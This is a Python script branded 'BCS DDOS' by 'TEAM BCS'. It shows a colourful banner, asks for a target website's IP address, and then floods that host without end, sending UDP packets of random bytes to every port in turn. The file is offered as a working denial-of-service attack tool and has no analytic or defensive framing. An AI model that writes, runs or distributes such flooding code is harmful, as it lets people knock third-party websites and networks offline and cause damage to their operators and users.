import socket
import random
import pyfiglet
import os
import time

# Clear screen
os.system("clear")

# Show Logo with lolcat
os.system('figlet -f slant "BCS DDOS" | lolcat')

# Fancy Rounded Banner
banner_top = "╭" + "─" * 56 + "╮"
banner_bottom = "╰" + "─" * 56 + "╯"
empty_line = "│" + " " * 56 + "│"

# Print with lolcat
os.system(f'echo "{banner_top}" | lolcat')
os.system(f'echo "{empty_line}" | lolcat')
os.system('echo "│   🔥 Author  :  TEAM BCS 🔥                            │" | lolcat')
os.system('echo "│   ⚡ Version : New Update 2.0 ⚡                       │" | lolcat')
os.system('echo "│   📢 Tool   :  Powerfull DdosAttack 📢                 │" | lolcat')
os.system(f'echo "{empty_line}" | lolcat')
os.system(f'echo "{banner_bottom}" | lolcat')
print()

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte_data = random._urandom(1490)

# Input target IP
ip = input("Enter Target Website IP: ")

sent = 0
port = 0

while True:
    port += 1
    sock.sendto(byte_data, (ip, port))
    sent += 1
    print(f"Connection Timeout  To Threat port {port}")
    if port == 65535:
        port = 0